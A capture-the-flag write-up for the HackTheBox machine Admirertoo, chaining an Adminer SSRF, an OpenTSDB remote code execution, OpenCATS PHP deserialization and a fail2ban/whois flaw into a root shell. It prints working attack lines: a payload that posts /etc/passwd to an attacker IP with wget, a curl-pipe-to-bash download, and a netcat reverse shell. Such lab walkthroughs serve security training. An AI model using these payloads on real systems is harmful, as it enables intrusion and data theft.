# HackTheBox-Admirertoo

## NMAP

```bash
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp    open     http           Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
4242/tcp  filtered vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

On the web serve we can see a default tempalate which is used

<img src="https://i.imgur.com/i3Ucl4h.png"/>

Running `gobuster` to fuzz for files , it didn't showed anything interesting

<img src="https://i.imgur.com/ZhVkDSb.png"/>

We can see a chat bubble on the page but it doesn't really make any requests 

<img src="https://i.imgur.com/0TR18vQ.png"/>

Making an invalid request will show a 404 page error but it will also reveal a domain name

<img src="https://i.imgur.com/Tt8x2wI.png"/>

Using this we can try to enumerate subdomains using `wfuzz` ,so add `admirer-gallery.htb` into `/etc/hosts` file

```bash
 wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://admirer-gallery.htb' -H "Host: FUZZ.admirer-gallery.htb" --hl 268
```

<img src="https://i.imgur.com/xGnom9O.png"/>

<img src="https://i.imgur.com/KggsH6J.png"/>

Checking the source of the page we can see that the password is already in the hidden parameter

<img src="https://i.imgur.com/QgmMF3k.png"/>

Logging in , it shows that this user doesn't have permissions so we can only see what's in the database and there wasn't anything interesting there

<img src="https://i.imgur.com/7DXdH5Q.png"/>

We only see the gallery table which had just the pictures that we saw on the adminer gallery page

<img src="https://i.imgur.com/Qjte76W.png"/>

So looking for exploits regarding `adminer 4.7.8` , it lead to a SSRF vulnerability

https://github.com/advisories/GHSA-x5r2-hj5c-8jx6

<img src="https://i.imgur.com/zdGGAaD.png"/>

Let's try to replicate it , from the document it also has given the script which was used in the poc

So I intercepted the login request ,and tried the adminer drivers one by one to see on which one we'll get a request 

https://github.com/vrana/adminer/tree/master/adminer/drivers

change the driver to `elastic` and change `server` to our IP and got a callback

<img src="https://i.imgur.com/0rypY15.png"/>

<img src="https://i.imgur.com/07uwkAR.png"/>

And if we go back to login page we'll see that the adminer galley source code gets reflected on the db page

<img src="https://i.imgur.com/KQLi9Gl.png"/>

If we look at our scan we saw few filtered ports 

<img src="https://i.imgur.com/VeySAt8.png"/>

Making a request to port 4242 will show us a different response

<img src="https://i.imgur.com/qJnyTdM.png"/>

<img src="https://i.imgur.com/lC0hp69.png"/>

From the respone we see that on port 4242 ,OpenTSDB is being used and looking up on google it does have a remote code execution through a GET parameter



 I copied the payload from here

https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2020/CVE-2020-35476.yaml

And change `m` paramter to  `http.stats.web.hits`
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=%5B33:system('wget%20--post-file%20/etc/passwd%20http://10.10.14.71/:2222/')%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

Through this payload I am just checking if I can read `/etc/passwd` file, running this with the same python file 

<img src="https://i.imgur.com/DHJFaBc.png"/>

Looking at our netcat listener we'll see that we have sent `/etc/passwd `file on our port 2222, to get a shell I tried running the reverse shell command directory with in the `system` arugment but it wasn't being executed so used `curl` to download this script shell having a netcat reverse shell and pipe it to bash to execute it

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.71 2222 >/tmp/f
```


```bash
sudo python2 exploit.py -p 80 "http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=%5B33:system('curl%20http://10.10.14.71:4444/shell.sh%7Cbash')%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```


<img src="https://i.imgur.com/tlTNu0N.png"/>

Stabilizing the shell with python3 

<img src="https://i.imgur.com/zgGC3Au.png"/>

I tried to run `sudo -l` to see if I can run anything as another user but it failed

<img src="https://i.imgur.com/2F6bN2s.png"/>

If we go into adminer's directory , there's a file named `servers.php` which has credentials to database

<img src="https://i.imgur.com/M6kYk1f.png"/>

Using this password for jennifer account , we'll be able to switch to that account

<img src="https://i.imgur.com/wWSjZqT.png"/>

Checked for SUID binaries but there wasn't any custom binary or some binary which isn't to be SUID only the default ones were shown, looking at local ports we can see port 8080 which is open

<img src="https://i.imgur.com/WbBVWDf.png"/>

Making a request to that port will tell that's using a software known as OpenCATS

<img src="https://i.imgur.com/44GRyob.png"/>

So we need to do port forwarding so that we can access this through our browser 

<img src="https://i.imgur.com/gipYgGs.png"/>

```bash
ssh -L 3333:127.0.0.1:8080 jennifer@10.10.11.137
```

Here `-L` tells to do local port forwarding , the first port that we are specfying is the port that will have the fort fowarded connection from the target machine's port, after that we'll specifiy localhost address so because we want to forward a port from the target machine and then we'll specify from which port we want to have the traffic forwarded which wil be port 8080 on which opencats is running

Visting the port on the browser will show us the login page for opencats

<img src="https://i.imgur.com/qLSWdwR.png"/>

Also looking for database credentials we find credentials for database that opencats is using in `/opt/opencats/config.php`

<img src="https://i.imgur.com/E8hjE9o.png"/>


Selecting the `users` table we can see  two users out of which we already have jennifer's password but we can change admin's password by updating the password hash 

<img src="https://i.imgur.com/k6Dj6N3.png"/>

<img src="https://i.imgur.com/DMkHItx.png"/>

So first generate a md5 hash of any text that you want to set password for admin user

<img src="https://i.imgur.com/v74RjGg.png"/>

Now update the password value for admin user in the table

```sql
UPDATE user SET password = '1bc29b36f623ba82aaf6724fd3b16718'  
WHERE user_id=1;
```

<img src="https://i.imgur.com/Hd2FHFS.png"/>

And now we can login as admin user as we have changed his password from the database

<img src="https://i.imgur.com/YaoHvFi.png"/>

Now this version of opencats was vulnerable to php deserialization attack

https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html

<img src="https://i.imgur.com/juFxAXz.png"/>

But issue is we don't know what should be our payload as we have port forwarded this and it's not running in /var/www/html and we don't know as which user this site is running as , looking in `/opt/opencats` we saw a file which is owned by group `devel`

<img src="https://i.imgur.com/cX0LdxU.png"/>

And this user isn't allowed to login 

<img src="https://i.imgur.com/nYaHYe1.png"/>

So could be that it's running as devel user and we need to see which folder is owned by this group so we can write a file to it 

<img src="https://i.imgur.com/tA9tVMn.png"/>

Also in `/etc`  there's a folder named `fail2ban` that is running on ssh  , looking at the configuration for that we can see it blocks the IP for 1 minute if there's a failure for root user 

<img src="https://i.imgur.com/OGLPiW0.png"/>

<img src="https://i.imgur.com/sD8n4fO.png"/>

There's an RCE in fail2ban service so we can abuse that by writing `whois.conf` file in`/usr/local/etc` through opencats php deserialization

https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm

First creating whois.conf file on our local machine with our IP address

<img src="https://i.imgur.com/nYBxIsq.png"/>

Running `phpggc` to generate a serialized object 

<img src="https://i.imgur.com/RMchpaE.png"/>

From opencats activites, clicking and clicking any column name to intercept the request 

<img src="https://i.imgur.com/bLfE4fp.png"/>

Replacing the serliaized object in `ActivityDataGrid`

<img src="https://i.imgur.com/wJ2eMbp.png"/>

With this we are able to create a whois.conf fifle but it isn't in the correct format

<img src="https://i.imgur.com/xzrAzAQ.png"/>

And if we do `whois IP` it's going to give an error 

<img src="https://i.imgur.com/u2hBM8U.png"/>

The reason is because whois.conf works having regex pattern entries

https://github.com/rfc1036/whois/blob/next/whois.conf

<img src="https://i.imgur.com/4Vzw0u4.png"/>

So we have to make a regex pattern out of this file we get having 

```
[{"Expires":1,"Discard":false,"Value":"10.10.16.24\n"}]
```

We need to add `}]` which will make this string 

```
[{"Expires":1,"Discard":false,"Value":"}]
```

In  regex `[]`  these brackets are considered to match everything 

```
}] IP
```

<img src="https://i.imgur.com/9Oc10vp.png"/>

Now we need to make the IP in a regex  pattern followed by a OR operator for comparing two regex patterns

```
}]| [IP]
````

<img src="https://i.imgur.com/UbiOMf5.png"/>

Now when we run `whois IP` we'll get a response on port 43 (which is a port used by whois)

<img src="https://i.imgur.com/WpfESHZ.png"/>

Following the fail2ban rce, we need to create a file which will respond to the request for whois on port `43` having our reverse shell starting with `~|` because that will cause commands to be executed

<img src="https://i.imgur.com/85Dm1nb.png"/>

<img src="https://i.imgur.com/q6S4Dd6.png"/>

We need to listen on this port while serving this file in response

<img src="https://i.imgur.com/bI1SATg.png"/>

<img src="https://i.imgur.com/NdDYhZ2.png"/>

I had trouble with running this command with `nc` so had to install `ncat` don't know what's the major difference but with ncat it was working

<img src="https://i.imgur.com/lNUHwtj.png"/>

Listening on the port where we will get a connection back from the reverse shell

<img src="https://i.imgur.com/sDZHyvU.png"/>

And lastly trigerring fail2ban by logging in with root user with multiple failed attemps which will cause whois to run on our IP that will respond on the request on port 43 with the reverse shell and executing it 

<img src="https://i.imgur.com/6T10hYu.png"/>

## References

- https://github.com/advisories/GHSA-x5r2-hj5c-8jx6
- https://github.com/vrana/adminer/tree/master/adminer/drivers
- https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2020/CVE-2020-35476.yaml
- https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/CVE-2020-35476%20OpenTSDB%202.4.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md
- https://www.w3schools.com/sql/sql_update.asp
- https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html
- https://github.com/rfc1036/whois/blob/next/whois.conf
- https://research.securitum.com/fail2ban-remote-code-execution/
- https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm
